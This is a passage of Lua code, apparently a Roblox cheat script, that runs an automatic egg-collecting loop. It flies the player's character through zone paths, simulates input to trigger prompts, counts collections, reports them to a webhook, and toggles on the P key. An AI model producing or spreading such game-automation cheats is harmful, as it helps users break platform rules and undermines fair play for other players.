            VirtualInputManager:SendKeyEvent(false, key, false, game)
        end
        return true
    end
    return false
end

local function huntTarget(obj, p)
    if not p or not p.Parent then return end
    local eggName, huntStart, tarZone, isEarlyExit = tostring(obj.Name), tick(), checkZone(p.Position), false
    local startZone = checkZone(rootPart.Position)

    if typeof(tarZone) == "number" and startZone ~= tarZone then
        local chain = getChainTo(tarZone)
        for _, zoneId in ipairs(chain) do
            if not isEarlyExit and checkZone(rootPart.Position) ~= zoneId then
                local data = islandZones[zoneId]
                local cPos = rootPart.Position
                local dPos = data.Path[1]
                if math.sqrt((cPos.X - dPos.X)^2 + (cPos.Y - dPos.Y)^2 + (cPos.Z - dPos.Z)^2) > 15 then
                    local res = smartPath(dPos, p, huntStart)
                    if res == "Timeout" or res == "NoPath" then isEarlyExit = true end
                end
                if not isEarlyExit then
                    for i = 1, #data.Path do
                        if not isFarming or humanoid.Health <= 0 or (tick() - huntStart > 60) then isEarlyExit = true break end
                        flyTo(data.Path[i], false, 6)
                    end
                end
            end
        end
    end

    if not isEarlyExit then
        while p and p.Parent and p.Transparency < 1 do
            if not isFarming or humanoid.Health <= 0 then break end
            if tick() - huntStart > 60 then tempSkips[obj] = true; break end

            local cPos = rootPart.Position
            local pPos = p.Position
            if math.sqrt((cPos.X - pPos.X)^2 + (cPos.Y - pPos.Y)^2 + (cPos.Z - pPos.Z)^2) < 8 then
                humanoid.PlatformStand = false
                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                task.wait(0.1)
                
                local prompted = interactWithPrompt(obj)
                if not prompted and p then interactWithPrompt(p) end

                local wt = 0
                while p and p.Parent and p.Transparency < 1 and wt < 2 do task.wait(0.1); wt = wt + 0.1 end
                totalCollected = totalCollected + 1
                local pointsNow = getPointsText()
                local prettyName = eggName:gsub("_", " "):gsub("(%a)([%w]*)", function(a, b) return a:upper() .. b end)
                lastLabel.Text = "Last: " .. prettyName
                countLabel.Text = "Collected: " .. totalCollected
                sendFarmWebhook(eggName, true, pointsNow)
                tempSkips = {}
                break
            end

            local status = smartPath(pPos, p, huntStart)
            if status == "Timeout" or status == "NoPath" or status == "Failed" then tempSkips[obj] = true; break end
        end
    end

    local myZone = checkZone(rootPart.Position)
    while typeof(myZone) == "number" do
        local data = islandZones[myZone]
        for i = #data.Path, 1, -1 do
            if not isFarming or humanoid.Health <= 0 then break end
            flyTo(data.Path[i], false, 6)
        end
        myZone = data.Parent
    end
    activeEggs[obj] = nil
end

task.spawn(function()
    while true do
        if isFarming and humanoid and humanoid.Health > 0 then
            local o, p = getBestEgg()
            if o and p then huntTarget(o, p) else task.wait(0.5) end
        else
            task.wait(0.5)
        end
        task.wait(0.05)
    end
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.P then
        isFarming = not isFarming
        updateVisuals()
        if not isFarming then
            local ap, ao = rootPart:FindFirstChild("FlyPos"), rootPart:FindFirstChild("FlyOri")
            if ap then ap.Enabled = false end
            if ao then ao.Enabled = false end
            humanoid.PlatformStand = false
            humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
        end
    end
end)

updateVisuals()
